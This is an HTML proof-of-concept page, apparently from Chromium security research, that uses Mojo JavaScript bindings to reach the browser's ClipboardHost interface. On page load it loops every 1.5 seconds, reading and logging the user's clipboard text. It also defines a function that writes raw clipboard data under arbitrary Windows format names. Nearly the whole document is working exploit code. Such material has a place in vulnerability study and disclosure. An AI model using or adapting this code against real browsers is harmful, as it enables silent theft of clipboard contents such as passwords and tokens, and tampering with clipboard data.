<html>
  <body>
      <script>
      IPCFuzzer.activate_leak_sanitizer();
      </script>
    <script src="mojo/public/js/mojo_bindings_lite.js"></script>
    <script src="mojo/public/js/mojo_bindings.js"></script>
    <script src="third_party/blink/public/mojom/clipboard/clipboard.mojom.js"></script>
    <script src="mojo/public/mojom/base/string16.mojom.js"></script>
    <script src="mojo/public/mojom/base/big_buffer.mojom.js"></script>
    <script>
      function clipboard_helper() {
        this.format_list = ["CF_TEXT", "CF_MoreOlePrivateData", "DataObject"];
        this.shm_handle = Mojo.createSharedBuffer(0x1000).handle;
        this.shm_buffer = this.shm_handle.mapBuffer(0x0, 0x1000);
        this.shm_view = new DataView(this.shm_buffer.buffer);
      }

      clipboard_helper.prototype.start = function() {
        console.log('[-] binding interface');

        this.clip = new blink.mojom.ClipboardHostPtr();
        Mojo.bindInterface(blink.mojom.ClipboardHost.name, mojo.makeRequest(this.clip).handle, 'context', true);

        console.log('[-] done');
      }


      clipboard_helper.prototype.leak_clipboard = function() {
        console.log('[-] leaking clipboard data');

        let prom = this.clip.readText(blink.mojom.ClipboardBuffer.kStandard, (e) => {console.log(e)});

        prom.then((e) => {
          let data = '';

          let x = e.result.data;
          console.log(x);

          for (let i = 0; i < e.result.data.$data.length; i+=2) {
            data = data + String.fromCharCode(e.result.data.$data[i]);
          }

          console.log('[-] clipboard text/plain: ' + data);
        });

        console.log('[-] done');
      }


      clipboard_helper.prototype.write_clipboard = function(format, data) {
        console.log('[-] writing clipboard with format: ' + this.format_list[format]);
        console.log('[-] and contents: ' + data);

        let big_buffer = new mojoBase.mojom.BigBuffer({'sharedMemory' : {'bufferHandle' : this.shm_handle, 'size' : 0x1000}});
        let arr_format = [];

        for (let i = 0; i < this.format_list[format].length; i++) {
          arr_format[i] = this.format_list[format].charCodeAt(i);
        }

        for (let i = 0; i < data.length; i++) {
          this.shm_view.setUint8(i, data.charCodeAt(i));
        }

        this.clip.writeRawData({'data' : arr_format}, big_buffer);
        this.clip.commitWrite();

        console.log('[-] done');
      }

      function poc_arb_write_format() {
        console.log('[-] starting');

        let helper_ = new clipboard_helper();

        helper_.start();
        helper_.write_clipboard(0, "Congratulations, now you've power over writeRawData :)");
      }

      function poc_read_clipboard() {
        console.log('[-] starting');

        var helper_ = new clipboard_helper();

        helper_.start();

        function leak() {
          helper_.leak_clipboard();

          setTimeout(leak, 1500);
        }
        leak();
      }

    </script>
  <body onload="poc_read_clipboard()" >
  </body>
</html>
